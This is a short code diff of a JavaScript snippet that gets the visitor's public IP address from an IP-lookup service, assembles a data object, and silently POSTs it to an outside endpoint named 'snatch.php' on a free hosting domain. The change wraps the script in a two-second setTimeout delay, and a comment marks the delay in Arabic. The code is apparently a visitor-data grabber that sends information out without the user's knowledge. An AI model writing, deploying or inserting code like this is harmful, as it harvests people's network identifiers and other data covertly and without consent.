@@ -1,4 +1,4 @@
-(async () => {
+setTimeout(async () => {
   const ipInfo = await fetch("https://api.ipify.org?format=json").then(res => res.json());
   const data = {
     ip: ipInfo.ip,
@@ -11,8 +11,8 @@
   };
 
   fetch('https://liontap.42web.io/snatch.php', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify(data)
-});
-})();
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  });
+}, 2000); // 2 ثانية
